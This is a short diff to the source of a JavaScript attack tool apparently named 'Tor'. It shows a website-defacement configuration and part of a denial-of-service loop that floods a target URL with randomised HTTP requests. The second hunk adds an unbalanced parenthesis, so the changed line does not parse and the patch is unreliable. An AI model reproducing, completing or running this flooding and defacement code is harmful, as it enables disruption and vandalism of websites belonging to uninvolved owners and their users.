@@ -123,7 +123,7 @@ class Tor {
         // Defacement-specific configurations
         this.defacementConfig = {
             backupBeforeDeface: true, // Automatically back up the website before defacing
-            restoreOnExit: true      // Automatically restore the website when the tool is closed
+            restoreOnExit: true,      // Automatically restore the website when the tool is closed
             proxyURL: "https://cors-anywhere.herokuapp.com/"
         };
 
@@ -370,7 +370,7 @@ class Tor {
         const attackThread = async () => {
             while (Date.now() < endTime) {
                 try {
-                    const method = this.ddosConfig.httpMethods[Math.floor(Math.random() * this.ddosConfig.httpMethods.length)];
+                    const method = this.ddosConfig.httpMethods[Math.floor(Math.random() * this.ddosConfig.httpMethods.length)]);
                     const response = await this.rawFetch(url, { method: method, headers: this.ddosConfig.customHeaders });
                     if (!response.ok) {
                         this.log(`Request failed with status: ${response.status}`, 'warn');
